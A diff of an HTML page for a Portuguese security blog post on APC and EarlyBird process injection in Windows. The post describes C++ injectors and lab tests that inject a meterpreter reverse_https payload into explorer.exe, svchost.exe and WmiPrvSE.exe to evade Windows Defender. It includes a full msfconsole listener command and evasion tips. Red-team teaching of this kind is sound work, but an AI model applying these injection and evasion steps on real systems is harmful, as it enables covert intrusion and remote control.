@@ -1,89 +1,243 @@
 <!DOCTYPE html>
-<html><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Security Researcher in Reversing/Malware/Low Level fields">
-    <meta name="Author" content="Midnight Reverser">
-    <meta name="keywords" content="midnighthackings midnight-rev midnight">
-    <link rel="stylesheet" href=https://blog.midnighthackings.com/css/syntax.css>
-    <link rel="stylesheet" href=https://blog.midnighthackings.com/css/style.css>
-    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
-    <title>Midnight Hackings - #FimDaEscala6x1</title>
-  </head><body><aside id="sidenav">
-    <header>
-    
-        <a href=https://blog.midnighthackings.com/><img src="https://blog.midnighthackings.com/avatar.png" alt="avatar"></a>
-        
-    
+<html lang="br">
+<head>
+  
+    <title>Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por diversão e lucro :: Midnight Hackings</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content=" Escrito por: Mateus Gualberto (Midnight Reverser) - orgulho de escrever sem IA envolvida no processo!
+Licença: livre, como todo conhecimento deve ser.
+Introdução Nesse artigo, iremos discutir o funcionamento de APCs em sistemas Windows e como podemos utilizá-las ao nosso favor em cenários de evasão de defesas e red teaming.
+Durante o artigo iremos construir alguns artefatos na linguagem C&#43;&#43;, sendo dois deles diretamente relacionados à injeção maliciosa de APCs. Na última seção, após todo o arcabouço teórico e prático adquirido, iremos testar um caso de uso real para evasão do Windows Defender.
+" />
+<meta name="keywords" content="midnight,blog,reverse-engineer,reversing" />
 
-    <a id="branding" href=https://blog.midnighthackings.com/>
-        
-            Midnight's Home
-        
-    </a>
-    </header>
+  <meta name="robots" content="noodp" />
 
-    <nav>
-        
-            		
-            <a href="/posts"
-                
-            >
-                <i class="fas fa-keyboard fa-ms"></i>
-                <span>posts</span>
-            </a>
-        
-            		
-            <a href="/tags"
-                
-            >
-                <i class="fas fa-tags fa-ms"></i>
-                <span>tags</span>
-            </a>
-        
-            		
-            <a href="https://github.com/midnight-rev"
-                
-                    target="_blank"
-                
-            >
-                <i class="fab fa-github fa-ms"></i>
-                <span>github</span>
-            </a>
-        
-            		
-            <a href="/index.xml"
-                
-            >
-                <i class="fas fa-rss fa-ms"></i>
-                <span>RSS</span>
-            </a>
-        
-            		
-            <a href="/contact"
-                
-            >
-                <i class="far fa-envelope"></i>
-                <span>contact</span>
-            </a>
-        
-    </nav>
-</aside>
-<main id="main">
-            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
-            <div class="content">
-<code>
-    <center>
-    <p style="font-weight: bolder;color: red;"> Midnight Hackings apoia o fim da escala 6x1. </p>
-    <p style="font-weight: bolder;color: red;">Todos nós trabalhadores devemos ter direito à vida além do trabalho! Trabalhadores unidos mudam o mundo.</p>
-    </center>
-</code>
+<link rel="canonical" href="https://blog.midnighthackings.com/posts/maldev-0x00/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="https://blog.midnighthackings.com/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="https://blog.midnighthackings.com/favicon.png">
+<link rel="apple-touch-icon" href="https://blog.midnighthackings.com/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="br" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por diversão e lucro">
+<meta property="og:description" content=" Escrito por: Mateus Gualberto (Midnight Reverser) - orgulho de escrever sem IA envolvida no processo!
+Licença: livre, como todo conhecimento deve ser.
+Introdução Nesse artigo, iremos discutir o funcionamento de APCs em sistemas Windows e como podemos utilizá-las ao nosso favor em cenários de evasão de defesas e red teaming.
+Durante o artigo iremos construir alguns artefatos na linguagem C&#43;&#43;, sendo dois deles diretamente relacionados à injeção maliciosa de APCs. Na última seção, após todo o arcabouço teórico e prático adquirido, iremos testar um caso de uso real para evasão do Windows Defender.
+" />
+<meta property="og:url" content="https://blog.midnighthackings.com/posts/maldev-0x00/" />
+<meta property="og:site_name" content="Midnight Hackings" />
+
+  <meta property="og:image" content="https://blog.midnighthackings.com/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2022-08-01 19:15:14 -0300 -03" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Midnight Hackings
+  </div>
+</a>
+
+    </div>
     
-    <h1 id="title">Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por diversão e lucro</h1>
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/posts">Postagens</a></li>
+        
+      
+        
+          <li><a href="/tags">Tags</a></li>
+        
+      
+        
+          <li><a href="https://github.com/midnight-rev">Github</a></li>
+        
+      
+        
+          <li><a href="/index.xml">RSS</a></li>
+        
+      
+        
+          <li><a href="/contact">Sobre</a></li>
+        
+      
+      
+        <hr />
+        
+          <li>
+            <a href="https://blog.midnighthackings.com/">🇧🇷 Brasileiro</a>
+          </li>
+        
+      
+    </ul>
+  </li>
+</ul>
+
     
+    
+      <ul class="menu menu--desktop menu--language-selector">
+  <li class="menu__trigger">🇧🇷 Brasileiro&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        <li><a href="https://blog.midnighthackings.com/">🇧🇷 Brasileiro</a></li>
+      
+    </ul>
+  </li>
+</ul>
+
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
     
       
-    <nav id="TableOfContents">
+        
+          <li><a href="/posts" >Postagens</a></li>
+        
+      
+        
+          <li><a href="/tags" >Tags</a></li>
+        
+      
+        
+          <li><a href="https://github.com/midnight-rev" >Github</a></li>
+        
+      
+        
+          <li><a href="/index.xml" >RSS</a></li>
+        
+      
+        
+          <li><a href="/contact" >Sobre</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://blog.midnighthackings.com/posts/maldev-0x00/">Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por diversão e lucro</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">01/08/2022&nbsp;[Atualizado em 01/08/2022]</time><span class="post-reading-time">17 minuto(s) de leitura (3566 palavras)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://blog.midnighthackings.com/tags/malware-dev/">malware-dev</a>&nbsp;
+      
+      #<a href="https://blog.midnighthackings.com/tags/injection/">injection</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Sumário
+      </h2>
+      <nav id="TableOfContents">
   <ul>
     <li><a href="#teoria">Teoria</a></li>
     <li><a href="#prática">Prática</a>
@@ -102,7 +256,15 @@
     <li><a href="#conclusão">Conclusão</a></li>
   </ul>
 </nav>
-    <h1 id="introdução">Introdução</h1>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <blockquote>
+<p>Escrito por: Mateus Gualberto (Midnight Reverser) - <strong>orgulho de escrever sem IA envolvida no processo!</strong><br>
+Licença: livre, como todo conhecimento deve ser.</p>
+</blockquote>
+<h1 id="introdução">Introdução<a href="#introdução" class="hanchor" ariaLabel="Anchor">#</a> </h1>
 <p>Nesse artigo, iremos discutir o funcionamento de APCs em sistemas Windows e como podemos utilizá-las ao nosso favor em cenários de evasão de defesas e red teaming.</p>
 <p>Durante o artigo iremos construir alguns artefatos na linguagem C++, sendo dois deles diretamente relacionados à injeção maliciosa de APCs. Na última seção, após todo o arcabouço teórico e prático adquirido, iremos testar um caso de uso real para evasão do Windows Defender.</p>
 <p>Caso o leitor queira seguir o passo-a-passo de criação, recomendo configurar a versão mais atual do Visual Studio Community em uma máquina virtual Windows 10, além de marcar a instalação das bibliotecas e ferramentas de compilação C/C++. Todos os códigos deverão ser compilados com a opção &ldquo;Release&rdquo; e arquitetura x64, a não ser que outra configuração seja especificada.</p>
@@ -113,15 +275,15 @@
 <li><a href="https://visualstudio.microsoft.com/pt-br/vs/community/">Visual Studio Community</a></li>
 <li><a href="https://bit.ly/windowsvm">Máquina virtual Windows 10 Evaluation</a></li>
 </ul>
-<h2 id="teoria">Teoria</h2>
+<h2 id="teoria">Teoria<a href="#teoria" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>APCs, ou <em>Asynchronous Procedure Calls</em>, são uma forma de sinalizar e executar instruções ou funções de forma assíncrona no contexto de uma thread em um determinado processo.
 Podem ser utilizadas como método de callback, e um exemplo desse uso é a função <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfileex">ReadFileEx</a>, que irá informar de forma assíncrona o status de completude ou cancelamento da leitura de um arquivo.</p>
 <p>Existem APCs em kernelmode, que podem ser gerenciadas por certos tipos de drivers, e em usermode, que será o foco desse artigo.</p>
 <p>A API necessária para se realizar uma APC em usermode é a <code>kernel32!QueueUserAPC</code>, que necessitará de 3 argumentos: um ponteiro para uma função APC (<em>pfnAPC</em>), um handle para a thread para onde a APC deverá ser enfileirada (<em>hThread</em>) e um ponteiro para argumentos extra a serem repassados para a função (<em>dwData</em>).</p>
 <p>A documentação da <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc#remarks">MSDN sobre as APCs</a> informa que não é recomendado o enfileiramento de APCs em threads que não são pertencentes ao processo que chamou <code>QueueUserAPC</code>, devido a problemas de <em>rebasing</em> e de arquitetura. Porém, não há impedimento a nível de implementação que evite o uso de handles para threads em outros processos.</p>
 <p>Nós, como atacantes, vamos ignorar o alerta de problemas relacionados a <em>rebasing</em>, visto que nosso shellcode não deverá sofrer alterações de funcionamento por esse motivo, e construiremos um injetor de APCs para threads em processos remotos.</p>
-<h2 id="prática">Prática</h2>
-<h3 id="apc-injection-clássico">APC Injection clássico</h3>
+<h2 id="prática">Prática<a href="#prática" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="apc-injection-clássico">APC Injection clássico<a href="#apc-injection-clássico" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <p>Um atacante poderá utilizar o funcionamento das APCs ao seu favor seguindo os passos descritos abaixo.</p>
 <ol>
 <li>O processo injetor irá obter um handle para um processo-vítima existente, com permissões de leitura, escrita e execução;</li>
@@ -144,7 +306,7 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 <p>Um problema relacionado ao uso dessa técnica é que seu uso pode resultar em um crash da aplicação injetada. Podemos tentar diminuir a probabilidade de crashes ao limitar a quantidade de threads para as quais o shellcode deverá ser enfileirado.</p>
 <p>Para testarmos na prática a eficácia da técnica APC Injection, utilizaremos a solução do Visual Studio disponível no meu <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Examples/APC%20Injector">Github</a> e utilizaremos o <em>explorer.exe</em> como alvo da nossa técnica.</p>
 <p>Vamos, primeiramente, fazer um <em>walthrough</em> pelo código do injetor.</p>
-<h4 id="apc-injector">APC Injector</h4>
+<h4 id="apc-injector">APC Injector<a href="#apc-injector" class="hanchor" ariaLabel="Anchor">#</a> </h4>
 <p>Nosso injetor será executado repassando o nome de um processo presente na máquina.</p>
 <p>No nosso código, utilizaremos principalmente funções da <code>windows.h</code> para alocar memória e injetar o shellcode e a <code>tlhelp32.h</code> para realizarmos um &ldquo;snapshot&rdquo; do estado atual do sistema, ação que permite a navegação por processos e threads. As funções importadas da <code>iostream</code> são opcionais e servirão para debugging, e utilizaremos sempre que possível as versões de funções que tratam dados UTF-16 devido a uma melhor compatibilidade com certas estruturas que usaremos no código.</p>
 <p>Utilizaremos uma diretiva de pré-processamento para definirmos uma macro (<code>THREAD_INJECTION_LIMIT</code>) que limitará a quantidade de threads que devem sofrer injeção. Isso é importante para termos mais controle sobre como a injeção é realizada, buscando evitar crashes. Porém, ao definirmos um limite, é possível que uma thread alertable não tenha o shellcode incluído nas sua fila de APCs. Aumente o valor caso a injeção não funcione.</p>
@@ -288,16 +450,19 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Note que na comparação do laço for estamos utilizando uma variável local <code>i</code>, comparada no início com <code>THREAD_INJECTION_LIMIT</code> e incrementada ao fim dele, para evitar que a injeção se dê em todas as threads.</p>
 <p>Abaixo podemos ver o resultado quando o alvo é o <em>explorer.exe</em>. Foi utilizado o um valor de <code>THREAD_INJECTION_LIMIT</code> de 2, mas é possível que a cada execução esse valor possa mudar. Caso o shellcode não rode, é recomendado aumentar esse valor e tentar novamente.</p>
-<p><img src="img/02d35dc60d39f4bebb0df0f074f7fb7b.png" alt="02d35dc60d39f4bebb0df0f074f7fb7b.png"></p>
-<p>Ao clicar no &ldquo;Ok&rdquo;, o processo do explorer irá crashar, porém nosso shellcode foi executado com sucesso.</p>
-<h3 id="earlybird-injection">EarlyBird Injection</h3>
+
+<img src="img/02d35dc60d39f4bebb0df0f074f7fb7b.png"  class="center"  style="border-radius: 1px;"    />
+
+
+<p>Ao clicar no &ldquo;Ok&rdquo;, o processo do explorer irá sair, pois nosso shellcode, nesse caso, chama a <code>ExitProcess</code>. Em shellcodes que retornam para a thread principal, isso pode causar crash da aplicação.</p>
+<h3 id="earlybird-injection">EarlyBird Injection<a href="#earlybird-injection" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <p>Para ilustrarmos a efetividade do uso de APCs em cenários de evasão de defesas, iremos testar uma variação de injeção chamado EarlyBird, ou, &ldquo;O madrugador&rdquo;.</p>
 <p>O EarlyBird tem esse nome devido ao modo como a APC é injetada no processo-alvo. Sua vantagem com relação à técnica descrita na seção anterior é que não é necessário que um processo esteja rodando e tenha uma thread que entre em modo alertable para que ele seja vítima. Para isso, o injetor irá criar um processo em modo suspenso - em que a thread principal ainda não iniciou - configurar e enfileirar a função maliciosa e ela sempre irá rodar, visto que APCs também são executadas assim que um processo criado em modo suspenso é resumido.</p>
 <blockquote>
 <p>Por criar um processo em modo suspenso, a injeção EarlyBird pode ter um nível de detecção maior soluções mais sofisticadas, como EDRs.</p>
 </blockquote>
 <p>Vamos analisar a construção do <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Examples/EarlyBird%20Injector">código</a>.</p>
-<h4 id="earlybird-injector">EarlyBird Injector</h4>
+<h4 id="earlybird-injector">EarlyBird Injector<a href="#earlybird-injector" class="hanchor" ariaLabel="Anchor">#</a> </h4>
 <p>O código a seguir é uma <em>proof-of-concept</em> da técnica EarlyBird.</p>
 <p>Utilizaremos as funções com protótipos definidos nos headers <code>windows.h</code> e <code>iostream</code> para a construção do injetor e funcionamento auxiliar, como escrita de mensagens.</p>
 <p>Também iremos definir uma variável global para guardar nosso shellcode x64 - como no caso anterior, apenas um shellcode não malicioso que utiliza MessageBox.</p>
@@ -381,9 +546,12 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 </span></span><span class="line"><span class="cl">    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;[+] EarlyBird injection successful :)&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>O resultado está expresso na imagem abaixo.</p>
-<p><img src="img/b490da5b43f58e192d19df97a8f6bded.png" alt="b490da5b43f58e192d19df97a8f6bded.png"></p>
+
+<img src="img/b490da5b43f58e192d19df97a8f6bded.png"  class="center"  style="border-radius: 1px;"    />
+
+
 <p>Agora que já entendemos o funcionamento das variações, vamos explicar um caso de uso, testado em laboratório, para bypass do Windows Defender.</p>
-<h2 id="evadindo-windows-defender-com-injeções-apc">Evadindo Windows Defender com injeções APC</h2>
+<h2 id="evadindo-windows-defender-com-injeções-apc">Evadindo Windows Defender com injeções APC<a href="#evadindo-windows-defender-com-injeções-apc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>Nesta seção, iremos tentar realizar o bypass dos módulos de Real Time Protection e Cloud-delivered Protection do Windows Defender. Para isso, testaremos a eficiência dos códigos de APC Injection, EarlyBird e Shellcode Runner (apenas um <em>wrapper</em> para rodar shellcode em um EXE), quando utilizados para injetar/carregar um payload do meterpreter, com níveis iguais de ofuscação e evasão de defesas. Os níveis são os seguintes:</p>
 <ul>
 <li>Detecção de ambientes Sandbox para evasão de Antivírus, via <code>GetSystemTime</code> (delay de 10 segundos na execução). Caso uma sandbox seja detectada, o processo deverá encerrar;</li>
@@ -400,69 +568,112 @@ Podem ser utilizadas como método de callback, e um exemplo desse uso é a funç
 <li><code>msfconsole -x &quot;use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.100.2; set LPORT 443; set EXITFUNC thread; exploit&quot;</code></li>
 </ul>
 </blockquote>
-<h3 id="resultados-shellcode-runner">Resultados Shellcode Runner</h3>
+<h3 id="resultados-shellcode-runner">Resultados Shellcode Runner<a href="#resultados-shellcode-runner" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <p>O código do Shellcode Runner utilizado está disponível <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeExecutor">nesse link</a>.</p>
 <p>Como explicado anteriormente, estamos utilizando o Shellcode Runner apenas como ponto de controle. Caso ele não seja detectado, então nossos níveis-padrão de ofuscação e evasão possivelmente são os responsáveis principais por esse resultado, e não as injeções APC. Caso contrário, temos uma boa probabilidade de que as técnicas que não foram detectadas obtiveram sucesso por causa da injeção realizada.</p>
 <p>Tal artefato foi identificado e bloqueado antes mesmo de executar qualquer instrução, evidenciando que apenas as evasões de assinatura e de sandbox existentes não seriam capazes de evadir o Windows Defender.</p>
-<p><img src="img/1fe26686d7e5d87fdb07420e06a85817.png" alt="1fe26686d7e5d87fdb07420e06a85817.png"></p>
-<h3 id="resultados-apc-injector">Resultados APC Injector</h3>
+
+<img src="img/1fe26686d7e5d87fdb07420e06a85817.png"  class="center"  style="border-radius: 1px;"    />
+
+
+<h3 id="resultados-apc-injector">Resultados APC Injector<a href="#resultados-apc-injector" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <p>O código do APC Injector utilizado está disponível <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/APCInjector">nesse link</a>.</p>
 <p>A injeção foi realizada no <em>explorer.exe</em>, porém, houve bloqueio do Windows Defender pouco após o estabelecimento da shell reversa, como destacado na imagem abaixo.</p>
-<p><img src="img/2ec798d5ca8bc8637f19dc256a6184a3.png" alt="2ec798d5ca8bc8637f19dc256a6184a3.png"></p>
-<h3 id="resultados-earlybird">Resultados EarlyBird</h3>
+
+<img src="img/2ec798d5ca8bc8637f19dc256a6184a3.png"  class="center"  style="border-radius: 1px;"    />
+
+
+<h3 id="resultados-earlybird">Resultados EarlyBird<a href="#resultados-earlybird" class="hanchor" ariaLabel="Anchor">#</a> </h3>
 <p>O código do EarlyBird utilizado está disponível <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/EarlyBird">nesse link</a>.</p>
 <p>Devido à natureza da injeção EarlyBird, podemos utilizá-la para enfileirar APCs em praticamente qualquer processo que possa ser criado diretamente por nosso usuário. Logo, vamos fazer alguns testes com relação aos processos <em>explorer.exe</em> e <em>svchost.exe</em>.</p>
 <p>O motivo para a escolha desses dois arquivos em específico é que o explorer.exe é um processo muito comum e que existe sempre em qualquer sistema Windows, que pode passar despercebido por softwares Antivírus. Já o svchost.exe também é comum e geralmente não gera suspeitas com relação ao tráfego de rede.</p>
 <p>Na imagem abaixo, podemos evidenciar o resultado do <em>explorer.exe</em>. A injeção foi um sucesso. Entretanto, ao tentarmos executar alguns comandos do meterpreter, como o comando <em>shell</em>, que nos dá controle sobre o cmd.exe do alvo, somos apresentados com bloqueios, com base em comportamento, do Windows Defender, que evita nosso acesso a shell local.</p>
-<p><img src="img/08aae613073683f12e9a22943a203e51.png" alt="08aae613073683f12e9a22943a203e51.png"></p>
+
+<img src="img/08aae613073683f12e9a22943a203e51.png"  class="center"  style="border-radius: 1px;"    />
+
+
 <p>Tal comportamento também ocorreu no <em>svchost.exe</em>:</p>
-<p><img src="img/569b8cf7f3ef7a7405fb29bd7bdc8cc6.png" alt="569b8cf7f3ef7a7405fb29bd7bdc8cc6.png"></p>
+
+<img src="img/569b8cf7f3ef7a7405fb29bd7bdc8cc6.png"  class="center"  style="border-radius: 1px;"    />
+
+
 <p>Possivelmente o Windows Defender monitora de perto as ações que o <em>explorer.exe</em> e <em>svchost.exe</em> realizam no sistema. A criação de um processo-filho do cmd.exe pode ser visto como comportamento suspeito a partir desses processos.</p>
-<h4 id="o-caso-wmiprvseexe">O caso WmiPrvSe.exe</h4>
+<h4 id="o-caso-wmiprvseexe">O caso WmiPrvSe.exe<a href="#o-caso-wmiprvseexe" class="hanchor" ariaLabel="Anchor">#</a> </h4>
 <p>O arquivo <code>C:\Windows\System32\wbem\WmiPrvSE.exe</code> é um caso especial, visto que ele pode ser utilizado para criar diversos outros processos. Uma reflexão surge a partir dessa informação: será que o comando <em>shell</em> do meterpreter seria executado sem bloqueios?</p>
 <p>Testando a injeção EarlyBird, com o mesmo shellcode utilizado anteriormente, mas agora tendo como alvo o arquivo <code>WmiPrvSE.exe</code>, resultou em estabelecimento com sucesso da comunicação reversa, como no caso anterior, porém também foi possível executar o comando <em>shell</em>, sem bloqueios pelo Windows Defender:</p>
-<p><img src="img/1cf41dad10930134b3851e679a28485b.png" alt="1cf41dad10930134b3851e679a28485b.png"></p>
-<h2 id="conclusão">Conclusão</h2>
+
+<img src="img/1cf41dad10930134b3851e679a28485b.png"  class="center"  style="border-radius: 1px;"    />
+
+
+<h2 id="conclusão">Conclusão<a href="#conclusão" class="hanchor" ariaLabel="Anchor">#</a> </h2>
 <p>O cenário mais efetivo para evasão dos módulos Real Time Protection e Cloud-delivered Protection do Windows Defender durante os testes realizados foi a injeção EarlyBird.</p>
 <p>Não houve detecção do injetor, nem do conteúdo injetado, apenas bloqueio por comportamento de certas funcionalidades (como o comando shell) do meterpreter quando ele foi injetado no <em>explorer.exe</em> e <em>svchost.exe</em>.</p>
 <p>Esse problema foi mitigado ao utilizarmos como alvo o arquivo <code>C:\Windows\System32\wbem\WmiPrvSE.exe</code>.</p>
 <p>É importante ressaltar que é possível gerar um shellcode para o EarlyBird que não é detectado ao ser injetado no <em>explorer.exe</em> ou <em>svchost.exe</em> - no msfvenom, executando novamente o comando para gerar um shellcode pode ser o suficiente. Muitos shellcodes foram gerados, e alguns deles funcionavam 100% nesses dois arquivos.</p>
 <p>Entretanto, durante os testes, o cenário mais estável para injeção foi o <code>WmiPrvSE</code>, no qual todas as variações de shellcode testadas resultaram em sucesso e não detecção do comando <em>shell</em>.</p>
 
+      </div></div>
+
+  
     
-    <div class="nav-next-prev">
-        <div class="nav-prev">
-            
-                <a href="https://blog.midnighthackings.com/posts/pentest-0x00/"><i class="fas fa-chevron-left"></i></a>
-            
-        </div>
-        <a class="nav-top" href="#">top</i></a>
-        <div class="nav-next">
-            
-                <a href="https://blog.midnighthackings.com/posts/crackme-0x00/"><i class="fas fa-chevron-right"></i></a>
-            
-        </div>
-    </div>
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Ler outras postagens</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="https://blog.midnighthackings.com/posts/crackme-0x00/" class="button inline prev">
+        &lt; [<span class="button__text">Crackme 0x00 - BruteVerse: Análise estática com radare2</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="https://blog.midnighthackings.com/posts/pentest-0x00/" class="button inline next">
+         [<span class="button__text">Pentest 0x00 - Netcat: O canivete suíço dos hackers</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
     
 
-            </div><footer>
-<div class="footer-content">
+  
+</article>
 
-  <div class="contact-info">
-      
-          <div class="footer-mail">
-          <i class="far fa-envelope"></i> <a href="mailto:midnight.reverser@outlook.com">midnight.reverser@outlook.com</a> </div>
-      
-      
   </div>
 
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Midnight Hackings apoia o fim da escala 6x1!</span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
 
-<img src="https://www.gnu.org/graphics/gplv3-with-text-136x68.png"/>
-&nbsp;&nbsp;
-<p class="copyright meta"> Midnight Hackings apoia GPL e o fim da escala 6x1!</p>
 
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
 </div>
-</footer></main>
-    </body>
-    <script src=https://blog.midnighthackings.com/js/navbutton.js></script>
+
+</body>
 </html>
